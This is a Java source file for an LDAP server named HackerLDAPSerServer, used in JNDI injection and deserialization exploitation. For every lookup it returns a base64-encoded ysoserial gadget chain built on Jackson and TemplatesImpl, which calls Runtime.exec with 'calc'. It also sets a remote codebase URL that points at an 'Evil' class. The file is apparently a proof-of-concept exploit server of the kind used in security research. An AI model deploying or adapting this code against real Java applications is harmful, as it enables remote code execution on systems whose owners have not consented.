package com.github.enokiy.deserialization.utils;

import java.net.*;
import java.text.ParseException;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;


public class HackerLDAPSerServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void lanuchLDAPServer() throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    Constants.ldapPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(Constants.httpUrl+"#Evil")));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + Constants.ldapPort);
            ds.startListening();
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            e.addAttribute("javaClassName", "foo");
            /** Payload2: Return Serialized Gadget **/
            try {
                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
                e.addAttribute("javaSerializedData",Base64.decode("rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIACEIABmZvcm1hdEkACmxpbmVOdW1iZXJMAA9jbGFzc0xvYWRlck5hbWVxAH4ABUwADmRlY2xhcmluZ0NsYXNzcQB+AAVMAAhmaWxlTmFtZXEAfgAFTAAKbWV0aG9kTmFtZXEAfgAFTAAKbW9kdWxlTmFtZXEAfgAFTAANbW9kdWxlVmVyc2lvbnEAfgAFeHABAAAAFnQAA2FwcHQAGnlzb3NlcmlhbC5wYXlsb2Fkcy5KYWNrc29udAAMSmFja3Nvbi5qYXZhdAAJZ2V0T2JqZWN0cHBzcQB+AAsBAAAADnEAfgANcQB+AA5xAH4AD3EAfgAQcHBzcQB+AAsBAAAAInEAfgANdAAZeXNvc2VyaWFsLkdlbmVyYXRlUGF5bG9hZHQAFEdlbmVyYXRlUGF5bG9hZC5qYXZhdAAEbWFpbnBwc3IAH2phdmEudXRpbC5Db2xsZWN0aW9ucyRFbXB0eUxpc3R6uBe0PKee3gIAAHhweHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AAF4cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4ABUwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGmMr+ur4AAAAyADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAARjYWxjCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyMTMyODc1MjM0MDM1MDABAB9MeXNvc2VyaWFsL1B3bmVyMTMyODc1MjM0MDM1MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAjAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHg="));
            } catch (ParseException e1) {
                e1.printStackTrace();
            }
            /** Payload2 end **/

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }

    public static void main(String[] args) throws Exception {

        System.out.println("HttpServerAddress: "+Constants.httpUrl);
        System.out.println("LDAPServerUrl: "+ Constants.ldapUrl + "Evil");
        lanuchLDAPServer();
    }
}